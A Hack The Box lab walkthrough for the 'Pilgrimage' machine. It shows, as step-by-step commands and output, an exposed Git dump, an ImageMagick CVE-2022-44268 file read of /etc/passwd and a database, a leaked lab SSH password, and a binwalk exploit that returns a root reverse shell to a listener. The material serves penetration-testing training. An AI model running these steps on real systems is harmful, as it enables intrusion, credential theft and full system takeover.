---
layout: post
title:  HTB Pilgrimage Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-07 07:00:00 +0300
image:  '/images/htb_pilgrimage.png'
tags:   [Write-ups, HTB, OSCP+, Linux, Easy, Git, CVE, Arbitrary-File-Read, pspy, binwalk]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [git-dumper to enumerate Git repository](#git-dumper-to-enumerate-git-repository)
  - [Identifying CVE-2022-44268](#identifying-cve-2022-44268)
  - [Arbitrary File Read with CVE-2022-44268](#arbitrary-file-read-with-cve-2022-44268)
- [Foothold](#foothold)
  - [Getting the password of emily with CVE-2022-44268](#getting-the-password-of-emily-with-cve-2022-44268)
  - [SSH access as emily](#ssh-access-as-emily)
- [Privilege Escalation](#privilege-escalation)
  - [Using pspy64 to discover malwarescan.sh script](#using-pspy64-to-discover-malwarescansh-script)
  - [Binwalk 2.3.2 exploit](#binwalk-232-exploit)

# Enumeration
### Nmap
```shell
nmap -A -T4 -p- -Pn 10.129.143.44
```
```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-07 11:36 EST
Nmap scan report for 10.129.143.44
Host is up (0.037s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.0
OS details: Linux 5.0
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   30.55 ms 10.10.14.1
2   32.27 ms 10.129.143.44

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.14 seconds
```
The Nmap scan only gave us two open ports. Port 22 SSH and Port 80 with a website.

Let's add pilgrimage.htb to /etc/hosts:
```shell
echo "10.129.143.44 pilgrimage.htb" | sudo tee -a /etc/hosts
```

Checking the website, we found an input form that let us choose a file, upload and shrink it. Apart of that, we didnt find much.

Usually, it's worth it running a nmap again if we find a domain like pilgrimage.htb. In this case, running a nmap scan again helped us identifying a Git repository:
```shell
nmap -A -T4 -p22,80 -Pn pilgrimage.htb
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-07 11:48 EST
Nmap scan report for pilgrimage.htb (10.129.143.44)
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Pilgrimage - Shrink Your Images
| http-git: 
|   10.129.143.44:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
|_http-server-header: nginx/1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.0 (99%), Linux 4.15 - 5.8 (95%), Linux 5.0 - 5.4 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), HP P2000 G3 NAS device (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   34.61 ms 10.10.14.1
2   34.67 ms pilgrimage.htb (10.129.143.44)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.99 seconds
```

### git-dumper to enumerate Git repository
```shell
# Install git-dumper
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
sudo chmod +x git_dumper.py

# Using git_dumper.py with python venv
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
python3 git_dumper.py http://pilgrimage.htb git
```
In the git folder created after using git-dumper, we found a file called magick:
```shell
cd git
ls -al

total 26972
drwxr-xr-x 5 Vorkharium kali     4096 Nov  7 11:57 .
drwxr-xr-x 5 Vorkharium kali     4096 Nov  7 11:56 ..
drwxr-xr-x 6 Vorkharium kali     4096 Nov  7 11:57 assets
-rwxr-xr-x 1 Vorkharium kali     5538 Nov  7 11:57 dashboard.php
drwxr-xr-x 7 Vorkharium kali     4096 Nov  7 11:57 .git
-rwxr-xr-x 1 Vorkharium kali     9250 Nov  7 11:57 index.php
-rwxr-xr-x 1 Vorkharium kali     6822 Nov  7 11:57 login.php
-rwxr-xr-x 1 Vorkharium kali       98 Nov  7 11:57 logout.php
-rwxr-xr-x 1 Vorkharium kali 27555008 Nov  7 11:57 magick
-rwxr-xr-x 1 Vorkharium kali     6836 Nov  7 11:57 register.php
drwxr-xr-x 4 Vorkharium kali     4096 Nov  7 11:57 vendor
```
Inside the index.php source code we can find the following:
```shell
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $image = new Bulletproof\Image($_FILES);
  if($image["toConvert"]) {
    $image->setLocation("/var/www/pilgrimage.htb/tmp");
    $image->setSize(100, 4000000);
    $image->setMime(array('png','jpeg'));
    $upload = $image->upload();
    if($upload) {
      $mime = ".png";
      $imagePath = $upload->getFullPath();
      if(mime_content_type($imagePath) === "image/jpeg") {
        $mime = ".jpeg";
      }
      $newname = uniqid();
      exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
      unlink($upload->getFullPath());
      $upload_path = "http://pilgrimage.htb/shrunk/" . $newname . $mime;
      if(isset($_SESSION['user'])) {
        $db = new PDO('sqlite:/var/db/pilgrimage');
        $stmt = $db->prepare("INSERT INTO `images` (url,original,username) VALUES (?,?,?)");
        $stmt->execute(array($upload_path,$_FILES["toConvert"]["name"],$_SESSION['user']));
      }
      header("Location: /?message=" . $upload_path . "&status=success");
    }
    else {
      header("Location: /?message=Image shrink failed&status=fail");
    }
  }
  else {
    header("Location: /?message=Image shrink failed&status=fail");
  }
}
```
The code tells us how to POST requests with images to to index.php and how they are being handled. There is one particular part that tells us magick is being used to convert the images shrinking them by 50%:
```shell
exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
```
### Identifying CVE-2022-44268
We can try using the file command on the magick file inside the git folder we got after using git_dumper:
```shell
file magick

magick: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9fdbc145689e0fb79cb7291203431012ae8e1911, stripped
```
That didnt tell us much. Let's run the file with --version parameter:
```shell
./magick --version

Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```
This gave us better results, now we know the version is ImageMagick 7.1.0-49.

Searching for "ImageMagick 7.1.0-49 exploit" on Google we found the following exploit:
```shell
https://github.com/entr0pie/CVE-2022-44268
```

### Arbitrary File Read with CVE-2022-44268
First, we need to download and read how to use the PoC from GitHub:
```shell
git clone https://github.com/entr0pie/CVE-2022-44268
cd CVE-2022-44268
pip3 install pypng
```
We will start reading the content of the /etc/passwd to enumerate users:
```shell
python3 CVE-2022-44268.py /etc/passwd
```
This created a file called output.png

Now we can go to the website, choose the file output.png and click on Shrink:
```shell
http://pilgrimage.htb
```

This gave us the following link as result:
```shell
http://pilgrimage.htb/shrunk/672cf840dc6c1.png
```
We will get the file into our Kali using wget:
```shell
wget http://pilgrimage.htb/shrunk/672cf840dc6c1.png
```
And use identify command to get the contents of the file:
```shell
identify -verbose 672cf840dc6c1.png
```

We will copy the part that interests us:
```shell
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73
62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d
5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e
6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334
3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e
2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374
656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72
6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65
6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e
0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052
65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973
74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573
796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69
7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c
6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d
652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78
3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f
737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a
```
And enter it on CyberChef with the recipe From Hex:
```shell
https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')
```

It gave us the following results, which are the contents of the /etc/passwd file:
```shell
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```
When we examined the files we got from git_dumper, we found that the website is interacting with a db:
```shell
if(isset($_SESSION['user'])) {
        $db = new PDO('sqlite:/var/db/pilgrimage');
        $stmt = $db->prepare("INSERT INTO `images` (url,original,username) VALUES (?,?,?)");
        $stmt->execute(array($upload_path,$_FILES["toConvert"]["name"],$_SESSION['user']));
      }
```
# Foothold
# Getting the password of emily with CVE-2022-44268
We will use the exploit like we did before to get the contents of /var/db/pilgrimage:
```shell
# Create output.png
python3 CVE-2022-44268.py /var/db/pilgrimage

# Choose the file and click Shrink
http://pilgrimage.htb

# Get the file with wget
wget http://pilgrimage.htb/shrunk/672cfac4ba42c.png

# Inspect the file to get the data for CyberChef
identify -verbose 672cfac4ba42c.png

# Convert it with CyberChef From Hex
https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')

# In the results after converting it with CyberChef, we can find the following credentials for emily
emily:abigchonkyboi123
```
### SSH access as emily
Now we can use the credentials we found to access SSH with the user emily:
```shell
ssh emily@10.129.143.44
# emily@10.129.143.44's password: abigchonkyboi123
```
### User Flag
We can get the user.txt at the following folder:
```shell
cat /home/emily/user.txt
```
# Privilege Escalation
### Using pspy64 to discover malwarescan.sh script
Getting pspy64:
https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

Move pspy64 to the target machine and use the following command to let it run for 5 minutes:
```shell
chmod +x pspy64
# Use timeout to run pspy64 for 5 minutes
timeout 5m ./pspy64
```
Examining the results of pspy64, we could find a script called malwarescan.sh being ran by root:
```shell
2024/11/08 06:33:13 CMD: UID=0     PID=719    | /bin/bash /usr/sbin/malwarescan.sh
```
If we examine the contents of malwarescan.sh, we can see that it uses binwalk:
```shell
cat /usr/sbin/malwarescan.sh

#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

We can now suppose, that binwalk may be the way to get root.

### Binwalk 2.3.2 exploit

We will enumerate the version of binwalk first:
```shell
binwalk --help

Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk

Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...
<SNIP>
```
Now that we know that the target is using the binwalk version 2.3.2, we will use Google to search for an exploit.

The following exploit took our attention:

https://www.exploit-db.com/exploits/51249

We can use searchsploit to download it directly:
```shell
searchsploit -m 51249

# And examine the exploit to see how to use it
python3 51249.py -h
```

After examining the exploit help parameter and code, we find out we can successfully carry out the privilege escalation running the following commands:
```shell
# Start nc listener
nc -lvnp 8443

# Create .png image
convert -size 100x100 xc:white privesc.png

# Run the exploit as follow
python3 51249.py privesc.png 10.10.14.206 8443

# Start python server on Kali where binwalk_exploit.png is located
python3 -m http.server 7000

# Use wget from the target machine to get the binwalk_exploit.png file there
wget http://10.10.14.206:7000/binwalk_exploit.png

# Move binwalk_exploit.png to the directory where malwarescan.sh is running files
cd /var/www/pilgrimage.htb/shrunk
cp /home/emily/binwalk_exploit.png .

# After copying the file into the /shrunk folder, we will get a response in our nc listener. We can also upgrade our shell using python
listening on [any] 8443 ...
connect to [10.10.14.206] from (UNKNOWN) [10.129.143.44] 57984
whoami
root
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@pilgrimage:~/quarantine#
```
### Root Flag
Now we can get the root.txt flag:
```shell
cat /root/root.txt
```